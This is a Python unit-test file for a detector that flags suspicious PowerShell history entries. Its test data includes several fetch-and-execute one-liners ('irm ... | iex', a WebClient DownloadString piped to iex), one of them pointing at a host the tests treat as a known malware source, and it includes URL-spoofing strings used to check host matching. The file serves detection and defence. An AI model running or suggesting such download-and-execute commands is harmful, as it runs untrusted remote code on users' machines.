import unittest

from jarvis import intrusion


class IntrusionHistoryTests(unittest.TestCase):
    def test_restmethod_alias_and_long_form_cannot_evade_detection(self):
        for command in ('irm', 'Invoke-RestMethod', 'IWR', 'Invoke-WebRequest'):
            with self.subTest(command=command):
                out = intrusion._history_findings({
                    'psHistory': [f'{command} https://unknown.example/a | iex']})
                self.assertEqual(out[0]['severity'], 'high')

    def test_actual_malware_lookalike_has_a_distinct_critical_alert(self):
        out = intrusion._history_findings({'psHistory': [
            'irm https://get.activate.win | iex',
            'irm https://get.activated.win | iex']})
        self.assertEqual([f['severity'] for f in out], ['critical', 'high'])
        self.assertNotEqual(out[0]['title'], out[1]['title'])
        self.assertIn('not established', out[0]['detail'])

    def test_host_matching_uses_authority_not_url_substrings(self):
        for url in ('https://get.activate.win.evil.example/',
                    'https://safe.example/get.activate.win',
                    'https://get.activate.win@safe.example/'):
            self.assertEqual(intrusion._history_malware_hosts(url), set())
        self.assertEqual(intrusion._history_malware_hosts(
            'https://GET.ACTIVATE.WIN.:443/a'), {'get.activate.win'})

    def test_known_malware_host_overrides_a_vendor_url_on_same_line(self):
        line = 'irm https://bun.sh/install.ps1 | iex; irm https://get.activate.win | iex'
        self.assertEqual(intrusion._history_severity(line), 'critical')

    def test_old_hit_is_not_hidden_behind_fifteen_installer_lines(self):
        history = ['iwr https://bun.sh/install.ps1 | iex'] * 16
        history.append('irm https://get.activate.win | iex')
        out = intrusion._history_findings({'psHistory': history})
        self.assertTrue(any(f['severity'] == 'critical' for f in out))

    def test_download_without_execution_is_not_matched_as_a_pipeline(self):
        self.assertFalse(intrusion.SUSPICIOUS_HISTORY.search(
            'irm https://example.com/status'))

    def test_original_unrecognized_webclient_command_stays_high(self):
        line = "iex ((New-Object Net.WebClient).DownloadString('https://get.activated.win'))"
        self.assertEqual(intrusion._history_findings({'psHistory':[line]})[0]['severity'], 'high')
